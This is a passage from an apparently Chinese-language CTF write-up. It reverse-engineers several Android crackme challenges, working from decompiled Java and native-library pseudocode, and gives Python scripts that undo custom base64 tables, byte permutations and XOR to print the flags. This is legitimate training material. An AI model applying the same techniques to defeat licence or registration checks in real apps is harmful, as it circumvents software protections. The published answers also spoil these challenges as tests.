(k = 0; k &lt;= 3; k++) &#123; if (enBytes[k] &lt;= (byte) 63) &#123; res.append(Base64ByteToStr[enBytes[k]]); &#125; else &#123; res.append('='); &#125; &#125; &#125; return res.toString(); &#125;&#125; 直接改表解码： 12345678910#!/usr/bin/env python#-*- encoding=utf-8 -*-from utils import *base64_charset = 'vwxrstuopq34567ABCDEFGHIJyz012PQRSTKLMNOZabcdUVWXYefghijklmn89+/='ciphertext = '5rFf7E2K6rqN7Hpiyush7E6S5fJg6rsi5NBf6NGT5rs='plaintext = decipher(ciphertext)print plaintext# 05397c42f9b6da593a3644162d36eb01 easyjavajadx 反编译，MainActivity 中看到主要是 b() 函数判断了 flag 的格式，下面主要是把 a 和 b 两个类的构造函数理清： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667package com.a.easyjava;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;import java.util.Timer;import java.util.TimerTask;public class MainActivity extends c &#123; private static char a(String str, b bVar, a aVar) &#123; return aVar.a(bVar.a(str)); &#125; private static Boolean b(String str) &#123; int i = 0; if (!str.startsWith(\"flag&#123;\")) &#123; return Boolean.valueOf(false); &#125; if (!str.endsWith(\"&#125;\")) &#123; return Boolean.valueOf(false); &#125; String substring = str.substring(5, str.length() - 1); b bVar = new b(Integer.valueOf(2)); a aVar = new a(Integer.valueOf(3)); StringBuilder stringBuilder = new StringBuilder(); int i2 = 0; while (i &lt; substring.length()) &#123; stringBuilder.append(a(substring.charAt(i) + \"\", bVar, aVar)); Integer valueOf = Integer.valueOf(bVar.b().intValue() / 25); // 将bVar中d的值除以25并赋值给valueOf if (valueOf.intValue() &gt; i2 &amp;&amp; valueOf.intValue() &gt;= 1) &#123; i2++; &#125; i++; &#125; return Boolean.valueOf(stringBuilder.toString().equals(\"wigwrkaugala\")); &#125; protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); findViewById(R.id.button).setOnClickListener(new OnClickListener(this) &#123; final /* synthetic */ MainActivity b; public void onClick(View view) &#123; if (MainActivity.b(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString()).booleanValue()) &#123; Toast.makeText(this, \"You are right!\", 1).show(); return; &#125; Toast.makeText(this, \"You are wrong! Bye~\", 1).show(); new Timer().schedule(new TimerTask(this) &#123; final /* synthetic */ AnonymousClass1 a; &#123; this.a = r1; &#125; public void run() &#123; System.exit(1); &#125; &#125;, 2000); &#125; &#125;); &#125;&#125; a 类的构造函数，是对数组 c 的重新排列。然后在 a() 函数中对输入的数字和下标进行转换： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748package com.a.easyjava;import java.util.ArrayList;public class a &#123; public static ArrayList&lt;Integer&gt; a = new ArrayList(); static String b = \"abcdefghijklmnopqrstuvwxyz\"; static Integer d = Integer.valueOf(0); Integer[] c = new Integer[]&#123;Integer.valueOf(7), Integer.valueOf(14), Integer.valueOf(16), Integer.valueOf(21), Integer.valueOf(4), Integer.valueOf(24), Integer.valueOf(25), Integer.valueOf(20), Integer.valueOf(5), Integer.valueOf(15), Integer.valueOf(9), Integer.valueOf(17), Integer.valueOf(6), Integer.valueOf(13), Integer.valueOf(3), Integer.valueOf(18), Integer.valueOf(12), Integer.valueOf(10), Integer.valueOf(19), Integer.valueOf(0), Integer.valueOf(22), Integer.valueOf(2), Integer.valueOf(11), Integer.valueOf(23), Integer.valueOf(1), Integer.valueOf(8)&#125;; public a(Integer num) &#123; int intValue; for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) &#123; a.add(this.c[intValue]); &#125; for (intValue = 0; intValue &lt; num.intValue(); intValue++) &#123; a.add(this.c[intValue]); &#125; &#125; public static void a() &#123; Integer num = d; d = Integer.valueOf(d.intValue() + 1); // 将d加一 if (d.intValue() == 25) &#123; // 判断d是否等于25 int intValue = ((Integer) a.get(0)).intValue(); a.remove(0); a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位 d = Integer.valueOf(0); // 将d设置成0 &#125; &#125; public char a(Integer num) &#123; int i = 0; Integer valueOf = Integer.valueOf(0); if (num.intValue() == -10) &#123; // 判断num是否为-10 a(); return \" \".charAt(0); &#125; while (i &lt; a.size() - 1) &#123; if (a.get(i) == num) &#123; valueOf = Integer.valueOf(i); // 获取a中等于num的元素，并将valueOf设置成其下标i &#125; i++; &#125; a(); return b.charAt(valueOf.intValue()); // 返回下标对应的b中的字符 &#125;&#125; b 类中同理，也是对下标的一个转换： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152package com.a.easyjava;import java.util.ArrayList;public class b &#123; public static ArrayList&lt;Integer&gt; a = new ArrayList(); static String b = \"abcdefghijklmnopqrstuvwxyz\"; static Integer d = Integer.valueOf(0); Integer[] c = new Integer[]&#123;Integer.valueOf(8), Integer.valueOf(25), Integer.valueOf(17), Integer.valueOf(23), Integer.valueOf(7), Integer.valueOf(22), Integer.valueOf(1), Integer.valueOf(16), Integer.valueOf(6), Integer.valueOf(9), Integer.valueOf(21), Integer.valueOf(0), Integer.valueOf(15), Integer.valueOf(5), Integer.valueOf(10), Integer.valueOf(18), Integer.valueOf(2), Integer.valueOf(24), Integer.valueOf(4), Integer.valueOf(11), Integer.valueOf(3), Integer.valueOf(14), Integer.valueOf(19), Integer.valueOf(12), Integer.valueOf(20), Integer.valueOf(13)&#125;; public b(Integer num) &#123; int intValue; for (intValue = num.intValue(); intValue &lt; this.c.length; intValue++) &#123; a.add(this.c[intValue]); &#125; for (intValue = 0; intValue &lt; num.intValue(); intValue++) &#123; a.add(this.c[intValue]); &#125; &#125; public static void a() &#123; int intValue = ((Integer) a.get(0)).intValue(); a.remove(0); a.add(Integer.valueOf(intValue)); // 将a的第一个元素添加到最后一位 b += \"\" + b.charAt(0); b = b.substring(1, 27); // 将b的第一个元素添加到最后一位 Integer num = d; d = Integer.valueOf(d.intValue() + 1); // 将d加一 &#125; public Integer a(String str) &#123; int i = 0; Integer valueOf = Integer.valueOf(0); if (b.contains(str.toLowerCase())) &#123; // 判断字符串是否在“abcdefghijklmnopqrstuvwxyz”中 Integer valueOf2 = Integer.valueOf(b.indexOf(str)); // str在b中的起始下标 while (i &lt; a.size() - 1) &#123; if (a.get(i) == valueOf2) &#123; // 获取a中与valueOf2相等的值，并设置valueOf为其下标i valueOf = Integer.valueOf(i); &#125; i++; &#125; &#125; else &#123; valueOf = str.contains(\" \") ? Integer.valueOf(-10) : Integer.valueOf(-1); // 判断字符串中是否有空格，如果有valueOf设置成-10，反之设置成-1 &#125; a(); return valueOf; &#125; public Integer b() &#123; return d; &#125;&#125; 其中有很多条件判断不可能发生，实际的算法逻辑没有反编译出的代码这么复杂。逆向实现脚本： 123456789101112131415161718192021222324252627#!/usr/bin/env pythonbArray = [17, 23, 7, 22, 1, 16, 6, 9, 21, 0, 15, 5, 10, 18, 2, 24, 4, 11, 3, 14, 19, 12, 20, 13, 8, 25]aArray = [21, 4, 24, 25, 20, 5, 15, 9, 17, 6, 13, 3, 18, 12, 10, 19, 0, 22, 2, 11, 23, 1, 8, 7, 14, 16]ciphertext = 'wigwrkaugala'table = 'abcdefghijklmnopqrstuvwxyz'valueOfArray = []for i in range(len(ciphertext)): valueOfArray.append(table.index(ciphertext[i]))print valueOfArraynumArray = []for i in range(len(valueOfArray)): numArray.append(aArray[valueOfArray[i]])print numArrayprefix = 'flag&#123;'suffix = '&#125;'substring = ''for i in range(len(numArray)): ch = table[bArray[numArray[i]]] substring += ch bArray.append(bArray[0]) del bArray[0] table = (table + table[0])[1:27]flag = prefix + substring + suffixprint flag easyjni反编译，其中调用了 a 函数，其中调用了 a 类中的 a 函数和在 libnative.so 实现的 ncheck 函数： 12345678910111213141516171819202122232425262728293031323334353637383940package com.a.easyjni;import android.os.Bundle;import android.support.v7.app.c;import android.view.View;import android.view.View.OnClickListener;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends c &#123; static &#123; System.loadLibrary(\"native\"); &#125; private boolean a(String str) &#123; try &#123; return ncheck(new a().a(str.getBytes())); &#125; catch (Exception e) &#123; return false; &#125; &#125; private native boolean ncheck(String str); protected void onCreate(Bundle bundle) &#123; super.onCreate(bundle); setContentView((int) R.layout.activity_main); findViewById(R.id.button).setOnClickListener(new OnClickListener(this) &#123; final /* synthetic */ MainActivity b; public void onClick(View view) &#123; if (this.b.a(((EditText) ((MainActivity) this).findViewById(R.id.edit)).getText().toString())) &#123; Toast.makeText(this, \"You are right!\", 1).show(); &#125; else &#123; Toast.makeText(this, \"You are wrong! Bye~\", 1).show(); &#125; &#125; &#125;); &#125;&#125; a 类里的 a 函数很容易发现是个换表 base64： 12345678910111213141516171819202122232425262728293031package com.a.easyjni;public class a &#123; private static final char[] a = new char[]&#123;'i', '5', 'j', 'L', 'W', '7', 'S', '0', 'G', 'X', '6', 'u', 'f', '1', 'c', 'v', '3', 'n', 'y', '4', 'q', '8', 'e', 's', '2', 'Q', '+', 'b', 'd', 'k', 'Y', 'g', 'K', 'O', 'I', 'T', '/', 't', 'A', 'x', 'U', 'r', 'F', 'l', 'V', 'P', 'z', 'h', 'm', 'o', 'w', '9', 'B', 'H', 'C', 'M', 'D', 'p', 'E', 'a', 'J', 'R', 'Z', 'N'&#125;; public String a(byte[] bArr) &#123; StringBuilder stringBuilder = new StringBuilder(); for (int i = 0; i &lt;= bArr.length - 1; i += 3) &#123; byte[] bArr2 = new byte[4]; byte b = (byte) 0; for (int i2 = 0; i2 &lt;= 2; i2++) &#123; if (i + i2 &lt;= bArr.length - 1) &#123; bArr2[i2] = (byte) (b | ((bArr[i + i2] &amp; 255) &gt;&gt;&gt; ((i2 * 2) + 2))); b = (byte) ((((bArr[i + i2] &amp; 255) &lt;&lt; (((2 - i2) * 2) + 2)) &amp; 255) &gt;&gt;&gt; 2); &#125; else &#123; bArr2[i2] = b; b = (byte) 64; &#125; &#125; bArr2[3] = b; for (int i3 = 0; i3 &lt;= 3; i3++) &#123; if (bArr2[i3] &lt;= (byte) 63) &#123; stringBuilder.append(a[bArr2[i3]]); &#125; else &#123; stringBuilder.append('='); &#125; &#125; &#125; return stringBuilder.toString(); &#125;&#125; 查看 native 层 ncheck 函数，是静态注册的。理一下发现是个简单的置换： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657signed int __fastcall Java_com_a_easyjni_MainActivity_ncheck(_JNIEnv *a1, int a2, jstring a3)&#123; int v3; // r8 _JNIEnv *env; // r5 jstring str; // r8 const char *utf_string; // r6 int i; // r0 char *v8; // r2 char v9; // r1 int j; // r0 bool v11; // nf unsigned __int8 v12; // vf int v13; // r1 signed int result; // r0 char s1[32]; // [sp+3h] [bp-35h] char tmp; // [sp+23h] [bp-15h] int v17; // [sp+28h] [bp-10h] v17 = v3; env = a1; str = a3; utf_string = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0); if ( strlen(utf_string) == 32 ) // len(str) == 32 &#123; i = 0; do &#123; v8 = &amp;s1[i]; s1[i] = utf_string[i + 16]; // s1[i] = str[i + 16] v9 = utf_string[i++]; v8[16] = v9; // s1[i + 16] = str[i] &#125; while ( i != 16 ); env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string); j = 0; do &#123; v12 = __OFSUB__(j, 30); v11 = j - 30 &lt; 0; tmp = s1[j]; s1[j] = s1[j + 1]; s1[j + 1] = tmp; // s1[j], s1[j + 1] = s1[j + 1], s1[j] j += 2; &#125; while ( v11 ^ v12 ); // while j &lt;= 30 v13 = memcmp(s1, \"MbT3sQgX039i3g==AQOoMQFPskB1Bsc7\", 0x20u); result = 0; if ( !v13 ) result = 1; &#125; else &#123; env-&gt;functions-&gt;ReleaseStringUTFChars(&amp;env-&gt;functions, str, utf_string); result = 0; &#125; return result;&#125; 逆向把位置颠倒的字符串倒回去，再用改表的 base64 解码： 123456789101112131415161718192021#!/usr/bin/env pythonfrom base64 import *base64_charset = 'i5jLW7S0GX6uf1cv3ny4q8es2Q+bdkYgKOIT/tAxUrFlVPzhmow9BHCMDpEaJRZN='ciphertext = 'MbT3sQgX039i3g==AQOoMQFPskB1Bsc7'ciphertext = [ord(c) for c in ciphertext]for i in range(len(ciphertext) / 2): ciphertext[2 * i], ciphertext[2 * i + 1] = ciphertext[2 * i + 1], ciphertext[2 * i]print ciphertextfor i in range(len(ciphertext) / 2): ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextciphertext = ''.join([chr(c) for c in ciphertext])print ciphertext# QAoOQMPFks1BsB7cbM3TQsXg30i9g3==plaintext = decipher(ciphertext)print plaintext# flag&#123;just_ANot#er_@p3&#125; easy-so用 jadx 反编译后，看到调用了 cyberpeace 类中的 CheckString 函数： 12345678910111213141516171819202122232425package com.testjava.jack.pingan2;import android.os.Bundle;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class MainActivity extends AppCompatActivity &#123; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); ((Button) findViewById(R.id.button)).setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; if (cyberpeace.CheckString(((EditText) MainActivity.this.findViewById(R.id.editText)).getText().toString()) == 1) &#123; Toast.makeText(MainActivity.this, \"\\u9a8c\\u8bc1\\u901a\\u8fc7!\", 1).show(); // 验证通过! &#125; else &#123; Toast.makeText(MainActivity.this, \"\\u9a8c\\u8bc1\\u5931\\u8d25!\", 1).show(); // 验证失败! &#125; &#125; &#125;); &#125;&#125; 看到函数在 Native 层实现： 123456789package com.testjava.jack.pingan2;public class cyberpeace &#123; public static native int CheckString(String str); static &#123; System.loadLibrary(\"cyberpeace\"); &#125;&#125; 发现是静态实现的函数，其中将输入调用了 TestDec，并将结果和指定字符串比较： 12345678910111213141516171819202122signed int __fastcall Java_com_testjava_jack_pingan2_cyberpeace_CheckString(_JNIEnv *a1, int a2, jstring *str)&#123; signed int v3; // r8 const char *str_1; // r9 int v5; // r6 const char *v6; // r5 signed int v7; // r1 v3 = 0; str_1 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, str, 0); v5 = strlen(str_1); v6 = (const char *)malloc(v5 + 1); v7 = 0; if ( v5 != -1 ) v7 = 1; _aeabi_memclr(&amp;v6[v5], v7); _aeabi_memcpy((int)v6, (int)str_1, v5); j_TestDec((int)v6); if ( !strcmp(v6, \"f72c5a36569418a20907b55be5bf95ad\") ) v3 = 1; return v3;&#125; 看一下 TestDec 发现和之前一样，也是一组简单置换： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748size_t __fastcall TestDec(const char *a1)&#123; char *str; // r4 size_t i; // r5 char *v3; // r1 char v4; // r0 size_t result; // r0 int j; // r5 char *v7; // r0 char v8; // r1 unsigned int v9; // r1 str = (char *)a1; if ( strlen(a1) &gt;= 2 ) &#123; i = 0; do &#123; v3 = &amp;str[i]; v4 = str[i]; str[i] = str[i + 16]; ++i; v3[16] = v4; // str[i], str[i + 16] = str[i + 16], str[i] &#125; while ( i &lt; strlen(str) &gt;&gt; 1 ); &#125; result = (unsigned __int8)*str; if ( !*str ) return result; *str = str[1]; str[1] = result; // str[0], str[1] = str[1], str[0] result = strlen(str); if ( result &lt; 3 ) return result; j = 0; do &#123; v7 = &amp;str[j]; v8 = str[j + 2]; v7[2] = str[j + 3]; v7[3] = v8; // str[j + 2], str[j + 3] = str[j + 3], str[j + 2] result = strlen(str); v9 = j + 4; j += 2; &#125; while ( v9 &lt; result ); return result;&#125; 照样学样逆一下就好了： 123456789101112131415#!/usr/bin/env pythonciphertext = 'f72c5a36569418a20907b55be5bf95ad'ciphertext = [ord(c) for c in ciphertext]ciphertext[0], ciphertext[1] = ciphertext[1], ciphertext[0]for i in range(len(ciphertext) / 2 - 1): ciphertext[2 * i + 2], ciphertext[2 * i + 3] = ciphertext[2 * i + 3], ciphertext[2 * i + 2]print ciphertextfor i in range(len(ciphertext) / 2): ciphertext[i], ciphertext[i + 16] = ciphertext[i + 16], ciphertext[i]print ciphertextplaintext = ''.join([chr(c) for c in ciphertext])print plaintext# 90705bb55efb59da7fc2a5636549812a Ph0en1x-100MainActivity 中，encrypt 和 getFlag 函数在 Native 层实现，getSecret 函数返回某种哈希摘要的十六进制字符串。输入经过 encrypt 函数操作后的值与 getFlag 的值相等： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758package com.ph0en1x.android_crackme;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.support.v7.app.AppCompatActivity;import android.view.View;import android.widget.EditText;import android.widget.Toast;import java.io.UnsupportedEncodingException;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends AppCompatActivity &#123; EditText etFlag; public native String encrypt(String str); public native String getFlag(); static &#123; System.loadLibrary(\"phcm\"); &#125; protected void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView((int) R.layout.activity_main); this.etFlag = (EditText) findViewById(R.id.flag_edit); &#125; public void onGoClick(View v) &#123; if (getSecret(getFlag()).equals(getSecret(encrypt(this.etFlag.getText().toString())))) &#123; Toast.makeText(this, \"Success\", 1).show(); &#125; else &#123; Toast.makeText(this, \"Failed\", 1).show(); &#125; &#125; public String getSecret(String string) &#123; // 获取某种哈希摘要的十六进制字符串 try &#123; byte[] hash = MessageDigest.getInstance(encrypt(\"KE3TLNE6M43EK4GM34LKMLETG\").substring(5, 8)).digest(string.getBytes(\"UTF-8\")); if (hash != null) &#123; StringBuilder hex = new StringBuilder(hash.length * 2); for (byte b : hash) &#123; if ((b &amp; MotionEventCompat.ACTION_MASK) &lt; 16) &#123; hex.append(\"0\"); &#125; hex.append(Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK)); &#125; return hex.toString(); &#125; &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); &#125; catch (UnsupportedEncodingException e2) &#123; e2.printStackTrace(); &#125; return null; &#125;&#125; 在 IDA 中看到静态注册的 encrypt 函数，对字符串的每个值进行了减一操作： 123456789101112jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_encrypt(_JNIEnv *a1, int a2, jstring a3)&#123; _JNIEnv *v3; // r6 const char *v4; // r4 const char *i; // r5 v3 = a1; v4 = a1-&gt;functions-&gt;GetStringUTFChars(&amp;a1-&gt;functions, a3, 0); for ( i = v4; i - v4 &lt; strlen(v4); ++i ) --*i; return v3-&gt;functions-&gt;NewStringUTF(&amp;v3-&gt;functions, v4);&#125; 反向加一，得到指定的哈希摘要是 MD5： 123456789101112#!/usr/bin/env pythonimport hashlibmd5hash = lambda m: hashlib.md5(m).hexdigest()secret_digest = 'KE3TLNE6M43EK4GM34LKMLETG'digest_type = ''for i in range(len(secret_digest)): digest_type += chr(ord(secret_digest[i]) - 1)digest_type = digest_type[5:8]print digest_type# MD5 接下来看 getFlag 函数，读取内存中 data 的值，在循环中对相邻两个值进行相减并加 1，然后和 key 值异或，最后返回字符串： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768jstring __fastcall Java_com_ph0en1x_android_1crackme_MainActivity_getFlag(_JNIEnv *a1)&#123; char *v1; // r4 _JNIEnv *v2; // r7 char *v3; // r3 int v4; // r0 int v5; // r1 char *v6; // r2 char *v7; // r3 int v8; // r0 int v9; // r1 int v10; // r4 int v11; // r0 __int16 v12; // r3 signed int l1; // r8 signed int l2; // r0 char *v15; // r9 char a; // r3 char b; // t1 int idx; // r1 char s; // [sp+4h] [bp-5Ch] char data_1[40]; // [sp+14h] [bp-4Ch] char v22; // [sp+40h] [bp-20h] v1 = data_1; v2 = a1; v3 = (char *)&amp;data; do &#123; v4 = *(_DWORD *)v3; // low 4 bytes v3 += 8; v5 = *((_DWORD *)v3 - 1); // high 4 bytes *(_DWORD *)v1 = v4; *((_DWORD *)v1 + 1) = v5; v1 += 8; &#125; while ( v3 != \"Hello Ph0en1x\" ); v6 = &amp;s; v7 = \"Hello Ph0en1x\"; do &#123; v8 = *(_DWORD *)v7; v7 += 8; v9 = *((_DWORD *)v7 - 1); *(_DWORD *)v6 = v8; *((_DWORD *)v6 + 1) = v9; v10 = (int)(v6 + 8); v6 += 8; &#125; while ( v7 != \"0en1x\" ); v11 = *(_DWORD *)v7; v12 = *((_WORD *)v7 + 2); *(_DWORD *)v10 = v11; *(_WORD *)(v10 + 4) = v12; l1 = strlen(&amp;s); // len('Hello Ph0en1x') l2 = strlen(data_1) - 1; // len(data) - 1 v15 = &amp;data_1[l2]; while ( l2 &gt; 0 ) &#123; a = *v15 + 1; *v15 = a; // data[l2] = data[l2] + 1 b = *(v15-- - 1); // data[l2 - 1] idx = l2-- % l1; // l2 % l1 v15[1] = ((a - b) ^ *(&amp;v22 + idx - 60)) - 1;// data[l2] = ((data[l2 + 1] - data[l2 - 1]) ^ s[idx]) - 1 &#125; data_1[0] = (data_1[0] ^ 0x48) - 1; return v2-&gt;functions-&gt;NewStringUTF(&amp;v2-&gt;functions, data_1);&#125; 因为涉及到了异或和减法的操作，需要注意到及时和 0xFF 与一下，不然结果会出错。脚本： 12345678910data = [0x2E, 0x36, 0x42, 0x4C, 0x5F, 0xBF, 0xE0, 0x3A, 0xA8, 0xC3, 0x20, 0x63, 0x89, 0xB7, 0xC0, 0x1C, 0x1D, 0x44, 0xC2, 0x28, 0x7F, 0xED, 0x02, 0x0E, 0x5D, 0x66, 0x8F, 0x98, 0xB5, 0xB7, 0xD0, 0x16, 0x4D, 0x83, 0xF8, 0xFB, 0x01, 0x43, 0x47]key = 'Hello Ph0en1x'l1 = len(key)l2 = len(data)for i in range(l2 - 1, 0, -1): data[i] = (((data[i] + 1 - data[i - 1]) ^ ord(key[i % l1])) &amp; 0xFF) - 1data[0] = (data[0] ^ 0x48) - 1flag = ''.join([chr(c + 1) for c in data])print flag# flag&#123;Ar3_y0u_go1nG_70_scarborough_Fair&#125; RememberOther这道题简直出的莫名其妙，发现如果用户名和密码都为空会返回 True，并且会弹出 strings.xml 中指向的 successed 字符串： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485package com.droider.crackme0201;import android.app.Activity;import android.os.Bundle;import android.support.v4.view.MotionEventCompat;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;import java.security.MessageDigest;import java.security.NoSuchAlgorithmException;public class MainActivity extends Activity &#123; private Button btn_register; private EditText edit_sn; private EditText edit_userName; public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); setTitle(R.string.unregister); this.edit_userName = (EditText) findViewById(R.id.edit_username); this.edit_sn = (EditText) findViewById(R.id.edit_sn); this.btn_register = (Button) findViewById(R.id.button_register); this.btn_register.setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; if (MainActivity.this.checkSN(MainActivity.this.edit_userName.getText().toString().trim(), MainActivity.this.edit_sn.getText().toString().trim())) &#123; Toast.makeText(MainActivity.this, R.string.successed, 0).show(); MainActivity.this.btn_register.setEnabled(false); MainActivity.this.setTitle(R.string.registered); return; &#125; Toast.makeText(MainActivity.this, R.string.unsuccessed, 0).show(); &#125; &#125;); &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.activity_main, menu); return true; &#125; private boolean checkSN(String userName, String sn) &#123; try &#123; if (userName.length() == 0 &amp;&amp; sn.length() == 0) &#123; return true; &#125; if (userName == null || userName.length() == 0) &#123; return false; &#125; if (sn == null || sn.length() != 16) &#123; return false; &#125; MessageDigest digest = MessageDigest.getInstance(\"MD5\"); digest.reset(); digest.update(userName.getBytes()); String hexstr = toHexString(digest.digest(), BuildConfig.FLAVOR); StringBuilder sb = new StringBuilder(); for (int i = 0; i &lt; hexstr.length(); i += 2) &#123; sb.append(hexstr.charAt(i)); &#125; if (sb.toString().equalsIgnoreCase(sn)) &#123; return true; &#125; return false; &#125; catch (NoSuchAlgorithmException e) &#123; e.printStackTrace(); return false; &#125; &#125; private static String toHexString(byte[] bytes, String separator) &#123; StringBuilder hexString = new StringBuilder(); for (byte b : bytes) &#123; String hex = Integer.toHexString(b &amp; MotionEventCompat.ACTION_MASK); if (hex.length() == 1) &#123; hexString.append('0'); &#125; hexString.append(hex).append(separator); &#125; return hexString.toString(); &#125;&#125; 在资源中找到指定的字符串： 12345678910111213141516&lt;?xml version=\"1.0\" encoding=\"utf-8\"?&gt;&lt;resources&gt; &lt;string name=\"app_name\"&gt;Crackme0201&lt;/string&gt; &lt;string name=\"hint_sn\"&gt;请输入16位的注册码&lt;/string&gt; &lt;string name=\"hint_username\"&gt;请输入用户名&lt;/string&gt; &lt;string name=\"info\"&gt;Xman Android&lt;/string&gt; &lt;string name=\"menu_settings\"&gt;Settings&lt;/string&gt; &lt;string name=\"register\"&gt;注 册&lt;/string&gt; &lt;string name=\"registered\"&gt;程序已注册&lt;/string&gt; &lt;string name=\"sn\"&gt;注册码：&lt;/string&gt; &lt;string name=\"successed\"&gt;md5:b3241668ecbeb19921fdac5ac1aafa69&lt;/string&gt; &lt;string name=\"title_activity_main\"&gt;Crackme&lt;/string&gt; &lt;string name=\"unregister\"&gt;程序未注册&lt;/string&gt; &lt;string name=\"unsuccessed\"&gt;无效用户名或注册码&lt;/string&gt; &lt;string name=\"username\"&gt;用户名：&lt;/string&gt;&lt;/resources&gt; 搜一下 MD5，得到原字符串为 YOU_KNOW_。但结果不对，网上找到别人的 wp，说另一半要结合 word 中的提示，出题人说他不懂安卓，那么我们就懂了，flag 就是 YOU_KNOW_ANDROID。 黑客精神这题相比前面的题目开始复杂起来了。在 MainActivity 中，看到一开始对一个 m 的值进行了判断。然后接下来在 onClick 中新建了一个 MyApp 实例，如果 m 为 0 就调用 doRegister 函数，其中跳转到 RegActivity。 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.ComponentName;import android.content.DialogInterface;import android.content.Intent;import android.os.Bundle;import android.os.Process;import android.util.Log;import android.view.Menu;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.Toast;public class MainActivity extends Activity &#123; private static String workString; private Button btn1; public void onCreate(Bundle savedInstanceState) &#123; String str2; super.onCreate(savedInstanceState); setContentView(R.layout.activity_main); String str1 = \"Xman\"; Log.d(\"com.gdufs.xman m=\", str1); MyApp myApp = (MyApp) getApplication(); int m = MyApp.m; if (m == 0) &#123; str2 = \"\\u672a\\u6ce8\\u518c\"; // 未注册 &#125; else if (m == 1) &#123; str2 = \"\\u5df2\\u6ce8\\u518c\"; // 已注册 &#125; else &#123; str2 = \"\\u5df2\\u6df7\\u4e71\"; // 已混乱 &#125; setTitle(str1 + str2); this.btn1 = (Button) findViewById(R.id.button1); this.btn1.setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; MyApp myApp = (MyApp) MainActivity.this.getApplication(); if (MyApp.m == 0) &#123; MainActivity.this.doRegister(); return; &#125; ((MyApp) MainActivity.this.getApplication()).work(); Toast.makeText(MainActivity.this.getApplicationContext(), MainActivity.workString, 0).show(); &#125; &#125;); &#125; public void doRegister() &#123; new Builder(this).setTitle(\"\\u6ce8\\u518c\").setMessage(\"Flag\\u5c31\\u5728\\u524d\\u65b9\\uff01\").setPositiveButton(\"\\u6ce8\\u518c\", new DialogInterface.OnClickListener() &#123; // Title =&gt; 注册 | Message =&gt; Flag就在前方！ | PositiveButton =&gt; 注册 public void onClick(DialogInterface dialog, int which) &#123; Intent intent = new Intent(); intent.setComponent(new ComponentName(BuildConfig.APPLICATION_ID, \"com.gdufs.xman.RegActivity\")); MainActivity.this.startActivity(intent); // 跳转到RegActivity MainActivity.this.finish(); &#125; &#125;).setNegativeButton(\"\\u4e0d\\u73a9\\u4e86\", new DialogInterface.OnClickListener() &#123; // NagetiveButton =&gt; 不玩了 public void onClick(DialogInterface dialog, int which) &#123; Process.killProcess(Process.myPid()); &#125; &#125;).show(); &#125; public void work(String str) &#123; workString = str; &#125; public boolean onCreateOptionsMenu(Menu menu) &#123; getMenuInflater().inflate(R.menu.menu_main, menu); return true; &#125;&#125; 然后看一下 MyApp 类中，发现分别有三个函数在 Native 层实现。其中 onCreate 中调用了 initSN 函数。SN 猜测是 Serial Number 即序列号： 123456789101112131415161718192021222324package com.gdufs.xman;import android.app.Application;import android.util.Log;public class MyApp extends Application &#123; public static int m = 0; public native void initSN(); public native void saveSN(String str); public native void work(); static &#123; System.loadLibrary(\"myjni\"); &#125; public void onCreate() &#123; initSN(); Log.d(\"com.gdufs.xman m=\", String.valueOf(m)); super.onCreate(); &#125;&#125; RegActivity 中获取输入的字符串，并作为 SN 传入 saveSN 函数。然后 App 将会把自己的进程杀死： 123456789101112131415161718192021222324252627282930313233343536373839package com.gdufs.xman;import android.app.Activity;import android.app.AlertDialog.Builder;import android.content.DialogInterface;import android.os.Bundle;import android.os.Process;import android.view.View;import android.view.View.OnClickListener;import android.widget.Button;import android.widget.EditText;import android.widget.Toast;public class RegActivity extends Activity &#123; private Button btn_reg; private EditText edit_sn; public void onCreate(Bundle savedInstanceState) &#123; super.onCreate(savedInstanceState); setContentView(R.layout.activity_reg); this.btn_reg = (Button) findViewById(R.id.button1); this.edit_sn = (EditText) findViewById(R.id.editText1); this.btn_reg.setOnClickListener(new OnClickListener() &#123; public void onClick(View v) &#123; String sn = RegActivity.this.edit_sn.getText().toString().trim(); if (sn == null || sn.length() == 0) &#123; 